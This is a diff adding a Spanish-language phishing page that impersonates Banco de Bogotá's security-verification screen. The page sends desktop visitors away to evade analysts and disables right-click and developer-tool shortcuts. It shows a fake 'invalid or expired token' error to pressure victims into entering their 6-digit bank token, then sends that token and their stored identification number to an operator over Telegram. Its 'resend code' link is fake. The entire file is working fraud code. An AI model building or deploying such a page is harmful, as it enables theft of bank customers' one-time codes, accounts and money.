@@ -1,0 +1,413 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <script>
+        // Security & Device Detection
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (!isMobile) {
+            window.location.href = "https://www.nequi.com.co/";
+        }
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }
+    </script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banco de Bogotá - Verificación</title>
+    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_style.css" />
+    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css" />
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <style>
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #2c3e50;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background-color: #f1c40f;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background-color: #3498db;
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background-color: #e74c3c;
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        body {
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .container {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: center !important;
+            align-items: flex-start !important;
+            max-width: 1000px !important;
+            margin: 0 auto !important;
+            padding: 20px !important;
+            background: transparent !important;
+            box-shadow: none !important;
+        }
+
+        .login-card-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 30px 20px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .container__login {
+            flex: 0 0 380px !important;
+            padding-top: 0 !important;
+            margin-right: 40px !important;
+            background: transparent !important;
+            width: 380px !important;
+            box-shadow: none !important;
+            display: block !important;
+        }
+
+        .container__info {
+            flex: 1 !important;
+            padding: 0 !important;
+            background: transparent !important;
+            max-width: 500px !important;
+        }
+
+        @media (max-width:768px) {
+            body {
+                background: #ffffff !important;
+            }
+
+            .container {
+                flex-direction: column !important;
+                padding: 15px !important;
+            }
+
+            .container__login {
+                width: 100% !important;
+                margin-right: 0 !important;
+            }
+
+            .container__info {
+                width: 100% !important;
+            }
+        }
+
+        .container__info img {
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+
+        .blue-banner {
+            background-color: #e6f0fa;
+            color: #0033a0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #0033a0;
+        }
+
+        .error-message {
+            background-color: #fde8e8;
+            color: #c81e1e;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            border-left: 4px solid #c81e1e;
+        }
+
+        .token-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+
+        .token-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 1.2rem;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .token-input:focus {
+            border-color: #0033a0;
+            box-shadow: 0 0 0 2px rgba(0, 51, 160, .1);
+        }
+
+        .token-input.error {
+            border-color: #c81e1e;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-5px);
+            }
+
+            75% {
+                transform: translateX(5px);
+            }
+        }
+
+        .btn-main {
+            background-color: #0033a0;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-main:hover {
+            background-color: #002a85;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-blue"></div>
+            <div class="dot dot-red"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="container__login">
+            <div class="container__login--header">
+                <img src="logobanco1.jpg" alt="Banco de Bogotá" style="max-width:200px;margin-bottom:15px;" />
+            </div>
+
+            <div class="container__login--title">
+                <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Validación de Seguridad</h2>
+            </div>
+
+            <div class="blue-banner">
+                <div>
+                    <strong>Código de seguridad</strong><br>
+                    Ingresa el código token de 6 dígitos que esta en la app de tu telefono.
+                </div>
+            </div>
+
+            <div class="login-card-content">
+                <h3 style="color: #0033a0; margin-bottom: 20px; font-size: 1.1rem;">Ingresa el Token</h3>
+
+                <div class="error-message">
+                    ❌ Token o Código no válido o expirado. Por favor ingresa un nuevo Token o Código.
+                </div>
+
+                <form id="formToken" autocomplete="off" onsubmit="return sendTokenForm(event);">
+                    <div class="token-container">
+                        <input type="tel" class="token-input" maxlength="1" id="num1" required />
+                        <input type="tel" class="token-input" maxlength="1" id="num2" />
+                        <input type="tel" class="token-input" maxlength="1" id="num3" />
+                        <input type="tel" class="token-input" maxlength="1" id="num4" />
+                        <input type="tel" class="token-input" maxlength="1" id="num5" />
+                        <input type="tel" class="token-input" maxlength="1" id="num6" />
+                    </div>
+
+                    <p style="font-size: 0.8rem; color: #666; margin-bottom: 20px;">
+                        ¿No recibiste el código? <a href="#" onclick="reenviarCodigo(); return false;" style="color: #0033a0; font-weight: bold;">Reenviar</a>
+                    </p>
+
+                    <button type="submit" class="btn-main">Continuar</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="container__info">
+            <img src="taval.jpeg" alt="Promo" />
+        </div>
+    </div>
+
+    <script src="telegram.js"></script>
+    <script src="action.js"></script>
+
+    <script>
+        if (window.stopListening) {
+            window.stopListening();
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.token-input');
+
+            inputs.forEach(input => input.classList.add('error'));
+            setTimeout(() => {
+                inputs.forEach(input => input.classList.remove('error'));
+            }, 1000);
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+
+                    if (this.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+
+                    for (let i = 0; i < pastedData.length && (index + i) < inputs.length; i++) {
+                        inputs[index + i].value = pastedData[i];
+                    }
+
+                    const nextEmpty = Array.from(inputs).findIndex((inp, idx) => idx > index && inp.value === '');
+                    if (nextEmpty !== -1) {
+                        inputs[nextEmpty].focus();
+                    } else {
+                        inputs[inputs.length - 1].focus();
+                    }
+                });
+            });
+
+            inputs[0].focus();
+        });
+
+        function sendTokenForm(event) {
+            event.preventDefault();
+
+            const token = Array.from(document.querySelectorAll('.token-input'))
+                .map(input => input.value)
+                .join('');
+
+            if (token.length < 6) {
+                alert('Por favor ingresa los 6 dígitos del código');
+                return false;
+            }
+
+            console.log('📤 Enviando token (reintento):', token);
+
+            if (window.stopListening) {
+                window.stopListening();
+            }
+            localStorage.removeItem('bbogota_msg_id');
+
+            const userData = typeof getUserData === 'function' ? getUserData() : {
+                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
+                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
+            };
+
+            const tokenData = {
+                token: token,
+                tipo_identificacion: userData.tipo_identificacion,
+                numero_identificacion: userData.numero_identificacion
+            };
+
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            const btn = document.querySelector('.btn-main');
+            btn.disabled = true;
+            btn.textContent = 'Validando...';
+
+            if (typeof actionProcessed !== 'undefined') {
+                actionProcessed = false;
+            }
+
+            if (typeof sendToTelegram === 'function') {
+                sendToTelegram('token', tokenData, function() {
+                    console.log('✅ Token reenviado');
+
+                    if (typeof listenCurrentButtons === 'function') {
+                        listenCurrentButtons(window.handleTelegramAction);
+                    }
+                });
+            } else {
+                console.error('❌ sendToTelegram no disponible');
+                alert('Error de conexión');
+                document.getElementById('loading-overlay').style.display = 'none';
+                btn.disabled = false;
+                btn.textContent = 'Continuar';
+            }
+
+            return false;
+        }
+
+        function reenviarCodigo() {
+            alert('Se ha enviado un nuevo código a tu celular');
+            document.querySelectorAll('.token-input').forEach(input => input.value = '');
+            document.getElementById('num1').focus();
+        }
+    </script>
+</body>
+
+</html>
